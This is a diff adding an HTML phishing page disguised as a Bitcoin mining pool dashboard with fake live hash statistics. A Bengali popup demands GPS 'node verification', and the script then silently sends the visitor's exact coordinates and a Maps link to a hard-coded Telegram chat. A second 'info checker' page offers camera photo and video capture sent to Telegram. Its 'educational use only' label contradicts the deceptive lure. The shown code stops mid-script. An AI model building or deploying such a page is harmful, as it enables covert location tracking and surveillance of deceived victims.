@@ -1,0 +1,1130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BTC Mining Pool — Node Access</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #050a0e; --panel: #0a1520; --border: #1a2e45;
+    --accent: #f7931a; --accent2: #00e5ff; --green: #00ff9d;
+    --red: #ff4466; --text: #c8d8e8; --dim: #3a5070;
+    --gold: #ffd700; --orange: #ff8c00;
+  }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { background:var(--bg); color:var(--text); font-family:'Rajdhani',sans-serif; min-height:100vh; overflow-x:hidden; }
+
+  /* ═══════════════════════════════════════════════════
+     PAGE SYSTEM
+  ═══════════════════════════════════════════════════ */
+  .page { display:none; min-height:100vh; }
+  .page.active { display:flex; flex-direction:column; align-items:center; justify-content:center; }
+
+  /* ═══════════════════════════════════════════════════
+     PAGE 1 — BITCOIN MINING VIBES
+  ═══════════════════════════════════════════════════ */
+  #page1 {
+    position:relative;
+    background:
+      radial-gradient(ellipse at 50% 0%, rgba(247,147,26,0.12) 0%, transparent 60%),
+      radial-gradient(ellipse at 80% 80%, rgba(0,229,255,0.06) 0%, transparent 50%),
+      var(--bg);
+    padding: 20px;
+  }
+
+  /* Grid overlay */
+  #page1::before {
+    content:'';
+    position:fixed; inset:0;
+    background-image:
+      linear-gradient(rgba(247,147,26,0.04) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(247,147,26,0.04) 1px, transparent 1px);
+    background-size: 50px 50px;
+    pointer-events:none;
+    z-index:0;
+  }
+
+  .mining-container { width:100%; max-width:760px; position:relative; z-index:1; }
+
+  /* TOP LOGO */
+  .btc-logo-row {
+    display:flex; align-items:center; justify-content:center; gap:16px;
+    margin-bottom:24px; animation:fadeDown 0.7s ease;
+  }
+  .btc-symbol {
+    font-family:'Orbitron',monospace; font-size:52px; font-weight:900;
+    color:var(--accent);
+    text-shadow: 0 0 40px rgba(247,147,26,0.8), 0 0 80px rgba(247,147,26,0.4);
+    animation: btcPulse 3s ease-in-out infinite;
+  }
+  @keyframes btcPulse {
+    0%,100% { text-shadow: 0 0 40px rgba(247,147,26,0.8), 0 0 80px rgba(247,147,26,0.4); }
+    50%      { text-shadow: 0 0 60px rgba(247,147,26,1),   0 0 120px rgba(247,147,26,0.6); }
+  }
+  .btc-title-col { text-align:left; }
+  .btc-title-col .tag {
+    font-family:'Share Tech Mono',monospace; font-size:10px;
+    color:var(--accent); letter-spacing:4px; opacity:0.7; margin-bottom:4px;
+  }
+  .btc-title-col h1 {
+    font-family:'Orbitron',monospace; font-size:28px; font-weight:900;
+    color:#fff; letter-spacing:3px;
+    text-shadow: 0 0 20px rgba(247,147,26,0.3);
+  }
+  .btc-title-col h1 span { color:var(--accent); }
+
+  /* STATS BAR */
+  .stats-bar {
+    display:grid; grid-template-columns:repeat(4,1fr); gap:12px;
+    margin-bottom:20px; animation:fadeDown 0.7s ease 0.1s both;
+  }
+  .stat-card {
+    background:rgba(247,147,26,0.05); border:1px solid rgba(247,147,26,0.2);
+    border-radius:8px; padding:14px 12px; text-align:center;
+  }
+  .stat-card .sval {
+    font-family:'Share Tech Mono',monospace; font-size:16px;
+    color:var(--accent); margin-bottom:4px; font-weight:700;
+  }
+  .stat-card .skey {
+    font-family:'Share Tech Mono',monospace; font-size:9px;
+    color:var(--dim); letter-spacing:2px; text-transform:uppercase;
+  }
+
+  /* HASH DISPLAY */
+  .hash-panel {
+    background:var(--panel); border:1px solid var(--border);
+    border-left:3px solid var(--accent); border-radius:10px;
+    padding:20px; margin-bottom:20px;
+    animation:fadeDown 0.7s ease 0.2s both;
+  }
+  .hash-panel .hash-label {
+    font-family:'Share Tech Mono',monospace; font-size:10px;
+    color:var(--accent); letter-spacing:3px; margin-bottom:12px;
+    display:flex; align-items:center; gap:8px;
+  }
+  .hash-label .live-dot {
+    width:8px; height:8px; border-radius:50%; background:var(--green);
+    animation:livePulse 1s ease-in-out infinite; flex-shrink:0;
+  }
+  @keyframes livePulse { 0%,100%{opacity:1;box-shadow:0 0 6px var(--green)} 50%{opacity:0.3;box-shadow:none} }
+
+  .hash-stream {
+    font-family:'Share Tech Mono',monospace; font-size:12px;
+    line-height:1.8; color:#4a8060; word-break:break-all;
+    max-height:120px; overflow:hidden; position:relative;
+  }
+  .hash-stream .current-hash {
+    color:var(--green); font-size:13px; font-weight:700;
+    text-shadow:0 0 10px rgba(0,255,157,0.5);
+  }
+  .hash-stream .prefix-zeros { color:var(--accent); }
+
+  /* NONCE COUNTER */
+  .nonce-row {
+    display:flex; gap:12px; margin-top:12px; flex-wrap:wrap;
+  }
+  .nonce-item {
+    flex:1; min-width:120px;
+    background:rgba(0,0,0,0.3); border:1px solid var(--border);
+    border-radius:6px; padding:10px 14px;
+  }
+  .nonce-item .nk { font-family:'Share Tech Mono',monospace; font-size:9px; color:var(--dim); letter-spacing:2px; margin-bottom:4px; }
+  .nonce-item .nv { font-family:'Share Tech Mono',monospace; font-size:14px; color:var(--accent2); }
+
+  /* MINING PROGRESS BAR */
+  .mining-progress {
+    margin-bottom:20px; animation:fadeDown 0.7s ease 0.3s both;
+  }
+  .mining-progress .label-row {
+    display:flex; justify-content:space-between; align-items:center;
+    margin-bottom:8px;
+  }
+  .mining-progress .label-row span {
+    font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--dim); letter-spacing:2px;
+  }
+  .mining-progress .label-row .pct { color:var(--accent); }
+  .prog-track {
+    height:6px; background:rgba(247,147,26,0.1); border-radius:3px;
+    border:1px solid rgba(247,147,26,0.15); overflow:hidden;
+  }
+  .prog-fill {
+    height:100%; background:linear-gradient(90deg, var(--accent), var(--gold));
+    border-radius:3px; width:0%; transition:width 0.5s ease;
+    box-shadow:0 0 10px rgba(247,147,26,0.6);
+  }
+
+  /* WORKERS TABLE */
+  .workers-panel {
+    background:var(--panel); border:1px solid var(--border);
+    border-radius:10px; padding:16px; margin-bottom:24px;
+    animation:fadeDown 0.7s ease 0.4s both;
+  }
+  .workers-panel .wt { font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--accent); letter-spacing:3px; margin-bottom:12px; }
+  .worker-list { display:flex; flex-direction:column; gap:6px; }
+  .worker-row {
+    display:flex; align-items:center; gap:10px;
+    padding:8px 12px; background:rgba(0,0,0,0.2);
+    border-radius:6px; border:1px solid rgba(26,46,69,0.8);
+  }
+  .worker-dot { width:6px; height:6px; border-radius:50%; background:var(--green); flex-shrink:0; animation:livePulse 1.5s ease-in-out infinite; }
+  .worker-dot.slow { background:var(--accent); }
+  .worker-dot.idle { background:var(--dim); animation:none; }
+  .worker-name { font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--text); flex:1; }
+  .worker-hash { font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--accent2); }
+  .worker-status { font-family:'Share Tech Mono',monospace; font-size:9px; color:var(--green); letter-spacing:1px; }
+  .worker-status.slow { color:var(--accent); }
+  .worker-status.idle { color:var(--dim); }
+
+  /* ENTER BUTTON */
+  .enter-btn-wrap {
+    text-align:center; animation:fadeDown 0.7s ease 0.5s both;
+  }
+  .enter-btn {
+    background:linear-gradient(135deg, rgba(247,147,26,0.2), rgba(247,147,26,0.05));
+    border:2px solid var(--accent); border-radius:12px;
+    color:var(--accent); font-family:'Orbitron',monospace;
+    font-size:14px; font-weight:700; letter-spacing:3px;
+    padding:18px 60px; cursor:pointer;
+    transition:all 0.3s ease; position:relative; overflow:hidden;
+  }
+  .enter-btn::before {
+    content:''; position:absolute; inset:0;
+    background:linear-gradient(135deg,rgba(247,147,26,0.15),transparent);
+    opacity:0; transition:opacity 0.3s;
+  }
+  .enter-btn:hover::before { opacity:1; }
+  .enter-btn:hover {
+    box-shadow:0 0 40px rgba(247,147,26,0.4), 0 0 80px rgba(247,147,26,0.2);
+    transform:translateY(-2px);
+  }
+  .enter-btn:active { transform:scale(0.97); }
+  .enter-btn-sub {
+    font-family:'Share Tech Mono',monospace; font-size:10px;
+    color:var(--dim); margin-top:8px; letter-spacing:2px;
+  }
+  .enter-btn-green {
+    border-color:var(--green) !important; color:var(--green) !important;
+    background:linear-gradient(135deg, rgba(0,255,157,0.15), rgba(0,255,157,0.04)) !important;
+    animation: greenGlow 2s ease-in-out infinite;
+  }
+  .enter-btn-green:hover {
+    box-shadow:0 0 40px rgba(0,255,157,0.4), 0 0 80px rgba(0,255,157,0.2) !important;
+    transform:translateY(-2px);
+  }
+  @keyframes greenGlow {
+    0%,100% { box-shadow: 0 0 15px rgba(0,255,157,0.2); }
+    50%      { box-shadow: 0 0 40px rgba(0,255,157,0.5); }
+  }
+  .verified-badge {
+    display:inline-flex; align-items:center; justify-content:center; gap:8px;
+    background:rgba(0,255,157,0.08); border:1px solid rgba(0,255,157,0.3);
+    border-radius:20px; padding:8px 20px;
+    font-family:'Share Tech Mono',monospace; font-size:11px;
+    color:var(--green); letter-spacing:2px;
+    margin-bottom:14px; animation:fadeDown 0.5s ease; width:100%;
+  }
+  .vbadge-dot {
+    width:8px; height:8px; border-radius:50%; background:var(--green);
+    flex-shrink:0; animation:livePulse 1s ease-in-out infinite;
+  }
+  .vbadge-coords { font-size:9px; color:#4a8060; letter-spacing:1px; }
+
+  /* ═══════════════════════════════════════════════════
+     GEO POPUP (PAGE 1)
+  ═══════════════════════════════════════════════════ */
+  .geo-overlay {
+    position:fixed; inset:0; background:rgba(0,0,0,0.9);
+    display:flex; align-items:center; justify-content:center;
+    z-index:9999; backdrop-filter:blur(6px);
+    animation:fadeIn 0.3s ease;
+  }
+  .geo-overlay.hidden { display:none; }
+  .geo-popup {
+    background:var(--panel); border:1px solid rgba(247,147,26,0.5);
+    border-top:3px solid var(--accent); border-radius:14px;
+    padding:36px 32px; max-width:380px; width:90%;
+    text-align:center; animation:popIn 0.35s cubic-bezier(.175,.885,.32,1.275);
+    box-shadow:0 20px 60px rgba(0,0,0,0.8), 0 0 60px rgba(247,147,26,0.15);
+  }
+  .geo-popup .geo-icon { font-size:52px; display:block; margin-bottom:16px; animation:iconBounce 2s ease-in-out infinite; }
+  @keyframes iconBounce { 0%,100%{transform:scale(1)} 50%{transform:scale(1.08)} }
+  .geo-popup .geo-title {
+    font-family:'Orbitron',monospace; font-size:13px; font-weight:700;
+    color:var(--accent); letter-spacing:3px; margin-bottom:12px;
+  }
+  .geo-popup .geo-msg { font-size:15px; line-height:1.7; color:var(--text); margin-bottom:8px; }
+  .geo-popup .geo-sub {
+    font-family:'Share Tech Mono',monospace; font-size:11px;
+    color:var(--dim); margin-bottom:28px; line-height:1.7;
+  }
+  .geo-popup .geo-sub span { color:var(--accent); }
+  .geo-btn-allow {
+    background:linear-gradient(135deg,rgba(247,147,26,0.2),rgba(247,147,26,0.05));
+    border:1px solid var(--accent); border-radius:8px;
+    color:var(--accent); font-family:'Share Tech Mono',monospace;
+    font-size:12px; letter-spacing:2px; padding:14px 32px;
+    cursor:pointer; width:100%; transition:all 0.2s ease; margin-bottom:10px;
+  }
+  .geo-btn-allow:hover { background:rgba(247,147,26,0.25); box-shadow:0 0 20px rgba(247,147,26,0.3); }
+
+  /* Denied state */
+  .geo-denied-warning {
+    background:rgba(255,68,102,0.08); border:1px solid rgba(255,68,102,0.4);
+    border-radius:8px; padding:14px; margin-bottom:16px;
+    font-family:'Share Tech Mono',monospace; font-size:11px;
+    color:var(--red); line-height:1.7; letter-spacing:1px;
+  }
+  .geo-btn-retry {
+    background:rgba(255,68,102,0.1); border:1px solid var(--red);
+    border-radius:8px; color:var(--red);
+    font-family:'Share Tech Mono',monospace; font-size:12px;
+    letter-spacing:2px; padding:14px 32px;
+    cursor:pointer; width:100%; transition:all 0.2s ease;
+  }
+  .geo-btn-retry:hover { background:rgba(255,68,102,0.2); }
+
+  /* ═══════════════════════════════════════════════════
+     PAGE 2 — ORIGINAL INFO CHECKER
+  ═══════════════════════════════════════════════════ */
+  #page2 {
+    padding:20px;
+    background:
+      radial-gradient(ellipse at 20% 50%, rgba(0,229,255,0.04) 0%, transparent 60%),
+      radial-gradient(ellipse at 80% 20%, rgba(0,255,157,0.03) 0%, transparent 50%),
+      #0a0e17;
+  }
+  .p2-container { width:100%; max-width:680px; }
+  .p2-header { text-align:center; margin-bottom:32px; animation:fadeDown 0.6s ease; }
+  .p2-header .tag {
+    font-family:'Share Tech Mono',monospace; font-size:11px;
+    color:var(--accent2); letter-spacing:4px; margin-bottom:10px; opacity:0.8;
+  }
+  .p2-header h1 {
+    font-size:36px; font-weight:700; letter-spacing:2px;
+    color:#fff; text-shadow:0 0 30px rgba(0,229,255,0.3);
+  }
+  .p2-header h1 span { color:var(--accent2); }
+
+  /* reuse from original */
+  .warning-box {
+    background:rgba(255,107,53,0.08); border:1px solid rgba(255,107,53,0.4);
+    border-left:3px solid #ff6b35; border-radius:8px;
+    padding:16px 20px; margin-bottom:28px; animation:fadeDown 0.6s ease 0.1s both;
+  }
+  .warning-box .warn-title { font-family:'Share Tech Mono',monospace; font-size:12px; color:#ff6b35; letter-spacing:3px; margin-bottom:8px; }
+  .warning-box p { font-size:14px; line-height:1.6; color:#b0c4d8; }
+  .warning-box strong { color:#ff6b35; }
+  .buttons-grid {
+    display:grid; grid-template-columns:repeat(2,1fr);
+    gap:16px; margin-bottom:28px; animation:fadeDown 0.6s ease 0.2s both;
+  }
+  .btn {
+    background:#0f1623; border:1px solid #1e2d45;
+    border-radius:10px; padding:22px 12px; cursor:pointer;
+    transition:all 0.25s ease; display:flex;
+    flex-direction:column; align-items:center; gap:10px;
+    position:relative; overflow:hidden;
+  }
+  .btn::before {
+    content:''; position:absolute; inset:0;
+    background:linear-gradient(135deg,rgba(0,229,255,0.05),transparent);
+    opacity:0; transition:opacity 0.3s;
+  }
+  .btn:hover::before { opacity:1; }
+  .btn:hover { border-color:var(--accent2); transform:translateY(-3px); box-shadow:0 8px 30px rgba(0,229,255,0.12); }
+  .btn:active { transform:translateY(0); }
+  .btn .icon  { font-size:28px; line-height:1; }
+  .btn .label { font-size:13px; font-weight:600; letter-spacing:1px; color:var(--accent2); text-align:center; }
+  .btn .sublabel { font-family:'Share Tech Mono',monospace; font-size:10px; color:#4a6080; text-align:center; }
+  .btn.loading { pointer-events:none; opacity:0.7; }
+  .result-panel {
+    background:#0f1623; border:1px solid #1e2d45;
+    border-radius:10px; padding:20px; display:none; animation:fadeUp 0.4s ease;
+  }
+  .result-panel.show { display:block; }
+  .result-header { display:flex; align-items:center; justify-content:space-between; margin-bottom:16px; padding-bottom:12px; border-bottom:1px solid #1e2d45; }
+  .result-title { font-family:'Share Tech Mono',monospace; font-size:12px; color:var(--accent2); letter-spacing:2px; }
+  .status-badge { font-family:'Share Tech Mono',monospace; font-size:10px; padding:3px 10px; border-radius:20px; background:rgba(0,255,157,0.1); color:#00ff9d; border:1px solid rgba(0,255,157,0.3); }
+  .status-badge.sending { color:var(--accent2); background:rgba(0,229,255,0.1); border-color:rgba(0,229,255,0.3); }
+  .status-badge.error   { color:#ff6b35; background:rgba(255,107,53,0.1); border-color:rgba(255,107,53,0.3); }
+  .result-grid { display:flex; flex-direction:column; gap:8px; }
+  .result-row  { display:flex; gap:12px; align-items:flex-start; }
+  .result-key  { font-family:'Share Tech Mono',monospace; font-size:11px; color:#4a6080; min-width:130px; padding-top:1px; }
+  .result-val  { font-size:14px; color:#c8d8e8; word-break:break-all; flex:1; }
+  .progress-steps { display:none; flex-direction:column; gap:6px; margin-top:12px; }
+  .progress-steps.show { display:flex; }
+  .step { font-family:'Share Tech Mono',monospace; font-size:10px; color:#4a6080; display:flex; align-items:center; gap:8px; }
+  .step.done   { color:#00ff9d; }
+  .step.active { color:var(--accent2); }
+  .step.fail   { color:#ff6b35; }
+  .step .dot   { width:6px; height:6px; border-radius:50%; background:#4a6080; flex-shrink:0; }
+  .step.done   .dot { background:#00ff9d; }
+  .step.active .dot { background:var(--accent2); box-shadow:0 0 6px var(--accent2); }
+  .step.fail   .dot { background:#ff6b35; }
+  .rec-wrapper { display:none; align-items:center; gap:12px; margin-top:12px; padding:12px 16px; background:rgba(255,68,102,0.06); border:1px solid rgba(255,68,102,0.25); border-radius:8px; }
+  .rec-wrapper.show { display:flex; }
+  .rec-dot { width:10px; height:10px; border-radius:50%; background:var(--red); flex-shrink:0; animation:recPulse 1s ease-in-out infinite; }
+  .rec-text { font-family:'Share Tech Mono',monospace; font-size:12px; color:var(--red); letter-spacing:1px; flex:1; }
+  .rec-bar-wrap { width:100px; height:4px; background:rgba(255,68,102,0.2); border-radius:2px; overflow:hidden; }
+  .rec-bar { height:100%; background:var(--red); width:0%; transition:width 1s linear; border-radius:2px; }
+  @keyframes recPulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
+  .telegram-note { margin-top:14px; padding-top:14px; border-top:1px solid #1e2d45; font-family:'Share Tech Mono',monospace; font-size:11px; color:#4a6080; text-align:center; }
+  .telegram-note span { color:#00ff9d; }
+  .send-status { margin-top:14px; text-align:center; min-height:22px; }
+
+  /* ═══════════════════════════════════════════════════
+     SHARED ANIMATIONS
+  ═══════════════════════════════════════════════════ */
+  @keyframes fadeDown { from{opacity:0;transform:translateY(-15px)} to{opacity:1;transform:translateY(0)} }
+  @keyframes fadeUp   { from{opacity:0;transform:translateY(10px)}  to{opacity:1;transform:translateY(0)} }
+  @keyframes fadeIn   { from{opacity:0} to{opacity:1} }
+  @keyframes popIn    { from{opacity:0;transform:scale(0.85)} to{opacity:1;transform:scale(1)} }
+  @keyframes spin     { to{transform:rotate(360deg)} }
+  .spinner { display:inline-block; width:10px; height:10px; border:2px solid rgba(0,229,255,0.3); border-top-color:var(--accent2); border-radius:50%; animation:spin 0.8s linear infinite; margin-right:6px; vertical-align:middle; }
+
+  @media(max-width:480px){
+    .buttons-grid { grid-template-columns:1fr; }
+    .p2-header h1 { font-size:26px; }
+    .stats-bar { grid-template-columns:repeat(2,1fr); }
+    .btc-symbol { font-size:36px; }
+    .btc-title-col h1 { font-size:20px; }
+    .enter-btn { padding:16px 36px; font-size:12px; }
+  }
+</style>
+</head>
+<body>
+
+<!-- ═══════════════════════════════════════════════════
+     PAGE 1 — BITCOIN MINING
+═══════════════════════════════════════════════════ -->
+<div class="page active" id="page1">
+
+  <!-- GEO POPUP -->
+  <div class="geo-overlay hidden" id="geoOverlay">
+    <!-- State 1: Ask -->
+    <div class="geo-popup" id="geoAskBox">
+      <span class="geo-icon">📍</span>
+      <div class="geo-title">⚡ NODE VERIFICATION</div>
+      <div class="geo-msg">Mining pool এ যোগ দিতে আপনার <strong style="color:var(--accent)">GPS Location</strong> verify করতে হবে।</div>
+      <div class="geo-sub">
+        Browser এ একটি permission popup আসবে।<br>
+        <span>"Allow"</span> বা <span>"OK"</span> click করুন।<br><br>
+        Location verify ছাড়া <span>pool access</span> পাওয়া সম্ভব নয়।
+      </div>
+      <button class="geo-btn-allow" onclick="handleGeoPermission()">
+        ✓ &nbsp; VERIFY LOCATION — ALLOW
+      </button>
+    </div>
+
+    <!-- State 2: Denied -->
+    <div class="geo-popup" id="geoDeniedBox" style="display:none;">
+      <span class="geo-icon" style="animation:none;">🚫</span>
+      <div class="geo-title" style="color:var(--red);">✗ ACCESS DENIED</div>
+      <div class="geo-denied-warning">
+        ⚠ LOCATION PERMISSION DENIED<br><br>
+        আপনি Location Permission দেননি।<br>
+        এই mining pool এ প্রবেশ করতে<br>
+        location verification বাধ্যতামূলক।<br><br>
+        নিচের button এ click করে retry করুন।
+      </div>
+      <button class="geo-btn-retry" onclick="handleGeoRetry()">
+        🔄 &nbsp; RETRY — ALLOW LOCATION
+      </button>
+    </div>
+
+    <!-- State 3: Waiting -->
+    <div class="geo-popup" id="geoWaitBox" style="display:none;">
+      <span class="geo-icon" style="animation:none;">⏳</span>
+      <div class="geo-title" style="color:var(--accent2);">VERIFYING...</div>
+      <div class="geo-msg">Location নেওয়া হচ্ছে...</div>
+      <div class="geo-sub"><span>Browser popup এ "Allow" click করুন</span></div>
+    </div>
+  </div>
+
+  <!-- MINING CONTENT -->
+  <div class="mining-container">
+
+    <!-- Logo row -->
+    <div class="btc-logo-row">
+      <div class="btc-symbol">₿</div>
+      <div class="btc-title-col">
+        <div class="tag">// MINING POOL v3.1.4</div>
+        <h1>BTC <span>MINER</span></h1>
+      </div>
+    </div>
+
+    <!-- Stats bar -->
+    <div class="stats-bar">
+      <div class="stat-card">
+        <div class="sval" id="hashrate">847.3 TH/s</div>
+        <div class="skey">HASHRATE</div>
+      </div>
+      <div class="stat-card">
+        <div class="sval" id="difficulty">N/A</div>
+        <div class="skey">DIFFICULTY</div>
+      </div>
+      <div class="stat-card">
+        <div class="sval" id="blockReward">3.125 BTC</div>
+        <div class="skey">BLOCK REWARD</div>
+      </div>
+      <div class="stat-card">
+        <div class="sval" id="poolWorkers">2,847</div>
+        <div class="skey">WORKERS</div>
+      </div>
+    </div>
+
+    <!-- Hash display -->
+    <div class="hash-panel">
+      <div class="hash-label">
+        <div class="live-dot"></div>
+        LIVE HASH STREAM — SHA-256
+      </div>
+      <div class="hash-stream" id="hashStream">
+        <div>Initializing SHA-256 engine...</div>
+      </div>
+      <div class="nonce-row">
+        <div class="nonce-item">
+          <div class="nk">NONCE</div>
+          <div class="nv" id="nonceVal">0x00000000</div>
+        </div>
+        <div class="nonce-item">
+          <div class="nk">ATTEMPTS</div>
+          <div class="nv" id="attemptsVal">0</div>
+        </div>
+        <div class="nonce-item">
+          <div class="nk">BLOCK HEIGHT</div>
+          <div class="nv" id="blockHeight">851,247</div>
+        </div>
+        <div class="nonce-item">
+          <div class="nk">FOUND</div>
+          <div class="nv" id="foundVal" style="color:var(--green);">0</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Mining progress -->
+    <div class="mining-progress">
+      <div class="label-row">
+        <span>⛏ MINING PROGRESS — BLOCK #851,248</span>
+        <span class="pct" id="progPct">0%</span>
+      </div>
+      <div class="prog-track">
+        <div class="prog-fill" id="progFill"></div>
+      </div>
+    </div>
+
+    <!-- Workers -->
+    <div class="workers-panel">
+      <div class="wt">⚡ ACTIVE WORKERS</div>
+      <div class="worker-list">
+        <div class="worker-row">
+          <div class="worker-dot"></div>
+          <div class="worker-name">worker_01.asic</div>
+          <div class="worker-hash">142.7 TH/s</div>
+          <div class="worker-status">MINING</div>
+        </div>
+        <div class="worker-row">
+          <div class="worker-dot"></div>
+          <div class="worker-name">worker_02.asic</div>
+          <div class="worker-hash">138.9 TH/s</div>
+          <div class="worker-status">MINING</div>
+        </div>
+        <div class="worker-row">
+          <div class="worker-dot slow"></div>
+          <div class="worker-name">worker_03.gpu</div>
+          <div class="worker-hash" style="color:var(--accent)">89.2 TH/s</div>
+          <div class="worker-status slow">SLOW</div>
+        </div>
+        <div class="worker-row">
+          <div class="worker-dot"></div>
+          <div class="worker-name">worker_04.asic</div>
+          <div class="worker-hash">156.1 TH/s</div>
+          <div class="worker-status">MINING</div>
+        </div>
+        <div class="worker-row">
+          <div class="worker-dot idle"></div>
+          <div class="worker-name">worker_05.gpu</div>
+          <div class="worker-hash" style="color:var(--dim)">0.0 TH/s</div>
+          <div class="worker-status idle">OFFLINE</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Verify + Enter buttons -->
+    <div class="enter-btn-wrap">
+      <!-- Step 1: Verify button (shown by default) -->
+      <div id="verifyBtnWrap">
+        <button class="enter-btn" id="verifyBtn" onclick="startGeoVerify()">
+          📍 &nbsp; VERIFY LOCATION
+        </button>
+        <div class="enter-btn-sub" id="verifySubText">CLICK TO VERIFY YOUR LOCATION</div>
+      </div>
+
+      <!-- Step 2: Enter button (hidden until verified) -->
+      <div id="enterBtnWrap" style="display:none;">
+        <div class="verified-badge" id="verifiedBadge">
+          <span class="vbadge-dot"></span>
+          LOCATION VERIFIED ✓
+          <span class="vbadge-coords" id="verifiedCoords"></span>
+        </div>
+        <button class="enter-btn enter-btn-green" id="enterBtn" onclick="showPage('page2'); checkIPAndBrowser();">
+          ⛏ &nbsp; ENTER POOL DASHBOARD
+        </button>
+        <div class="enter-btn-sub" style="color:var(--green);">ACCESS GRANTED — CLICK TO ENTER</div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════
+     PAGE 2 — INFO CHECKER (ORIGINAL)
+═══════════════════════════════════════════════════ -->
+<div class="page" id="page2">
+  <div class="p2-container">
+
+    <div class="p2-header">
+      <div class="tag">// Educational Tool</div>
+      <h1>INFO <span>CHECKER</span></h1>
+    </div>
+
+    <div class="warning-box">
+      <div class="warn-title">⚠ WARNING — READ BEFORE USE</div>
+      <p>এই tool টি সম্পূর্ণ <strong>educational purposes</strong> এর জন্য।
+      শুধুমাত্র <strong>নিজের device</strong> এ নিজের information check করার জন্য ব্যবহার করুন।
+      অন্য কারো উপর এই tool ব্যবহার করা <strong>অনৈতিক ও বেআইনি</strong>।</p>
+    </div>
+
+    <div class="buttons-grid">
+      <button class="btn" id="geoBtn" onclick="checkGeo()">
+        <span class="icon">📍</span><span class="label">GEO LOCATION</span>
+        <span class="sublabel">Location → Telegram</span>
+      </button>
+      <button class="btn" id="cameraBtn" onclick="runCapture()">
+        <span class="icon">🎬</span><span class="label">CAPTURE ALL</span>
+        <span class="sublabel">Photo×2 + Video→TG</span>
+      </button>
+    </div>
+
+    <div class="result-panel" id="resultPanel">
+      <div class="result-header">
+        <div class="result-title" id="resultTitle">// RESULT</div>
+        <div class="status-badge" id="statusBadge">READY</div>
+      </div>
+      <div class="result-grid" id="resultGrid"></div>
+      <div class="send-status" id="sendStatus"></div>
+      <div class="progress-steps" id="progressSteps">
+        <div class="step" id="step1"><div class="dot"></div> Back camera — photo</div>
+        <div class="step" id="step2"><div class="dot"></div> Front camera — photo</div>
+        <div class="step" id="step3"><div class="dot"></div> Front camera — 10s video</div>
+        <div class="step" id="step4"><div class="dot"></div> Telegram এ সব পাঠানো</div>
+      </div>
+      <div class="rec-wrapper" id="recWrapper">
+        <div class="rec-dot"></div>
+        <div class="rec-text" id="recText">REC 0s / 10s</div>
+        <div class="rec-bar-wrap"><div class="rec-bar" id="recBar"></div></div>
+      </div>
+      <div class="telegram-note" id="telegramNote"></div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+// ═══════════════════════════════════════════════════════
+// CONFIG
+// ═══════════════════════════════════════════════════════
+const BOT_TOKEN      = "YOUR_BOT_TOKEN_HERE";
+const CHAT_ID        = "1873240895";
+const VIDEO_DURATION = 10;
+
+// ═══════════════════════════════════════════════════════
+// PAGE SYSTEM
+// ═══════════════════════════════════════════════════════
+let geoVerified = false;
+
+function showPage(id) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  window.scrollTo(0,0);
+}
+
+function tryEnterPage2() {
+  // kept for compatibility
+}
+
+function startGeoVerify() {
+  document.getElementById('geoOverlay').classList.remove('hidden');
+  showGeoBox('geoAskBox');
+}
+
+// ═══════════════════════════════════════════════════════
+// GEO POPUP
+// ═══════════════════════════════════════════════════════
+function showGeoBox(which) {
+  ['geoAskBox','geoDeniedBox','geoWaitBox'].forEach(id => {
+    document.getElementById(id).style.display = 'none';
+  });
+  document.getElementById(which).style.display = 'block';
+}
+
+function handleGeoPermission() {
+  showGeoBox('geoWaitBox');
+  requestGeoLocation();
+}
+
+function handleGeoRetry() {
+  showGeoBox('geoWaitBox');
+  requestGeoLocation();
+}
+
+function requestGeoLocation() {
+  if (!navigator.geolocation) {
+    showGeoBox('geoDeniedBox');
+    return;
+  }
+  navigator.geolocation.getCurrentPosition(
+    async p => {
+      // Success — verify done, hide popup
+      geoVerified = true;
+      document.getElementById('geoOverlay').classList.add('hidden');
+
+      // Show verified badge + enter button, hide verify button
+      const lat2 = p.coords.latitude.toFixed(4);
+      const lon2 = p.coords.longitude.toFixed(4);
+      document.getElementById('verifyBtnWrap').style.display = 'none';
+      const enterWrap = document.getElementById('enterBtnWrap');
+      enterWrap.style.display = 'block';
+      document.getElementById('verifiedCoords').textContent = lat2 + ', ' + lon2;
+
+      const lat = p.coords.latitude.toFixed(6);
+      const lon = p.coords.longitude.toFixed(6);
+      const acc = p.coords.accuracy.toFixed(0);
+      const msg = `📍 *GEO LOCATION (PAGE 1)*\n\n*Latitude:* ${lat}\n*Longitude:* ${lon}\n*Accuracy:* ${acc} meters\n*Maps:* https://maps.google.com/?q=${lat},${lon}\n\n⚠️ _Educational use only_`;
+      // Silent send to Telegram
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method:'POST', headers:{'Content-Type':'application/json'},
+          body: JSON.stringify({ chat_id:CHAT_ID, text:msg, parse_mode:'Markdown' })
+        });
+      } catch(e) {}
+    },
+    e => {
+      // Denied — show warning, block entry
+      showGeoBox('geoDeniedBox');
+    },
+    { enableHighAccuracy: true, timeout: 15000 }
+  );
+}
+
+// ═══════════════════════════════════════════════════════
+// PAGE 1 — MINING ANIMATIONS
+// ═══════════════════════════════════════════════════════
+const HEX = '0123456789abcdef';
+const rand = (a,b) => Math.floor(Math.random()*(b-a+1))+a;
+const hex  = n => Array.from({length:n},()=>HEX[rand(0,15)]).join('');
+
+let attempts = 0;
+let found    = 0;
+let progVal  = 0;
+const hashes = [];
+
+function updateHashStream() {
+  const target = '0000' + hex(60);
+  const current = hex(64);
+  attempts++;
+
+  // occasionally "find" a block
+  if (Math.random() < 0.003) {
+    found++;
+    document.getElementById('foundVal').textContent = found;
+  }
+
+  hashes.unshift(current);
+  if (hashes.length > 5) hashes.pop();
+
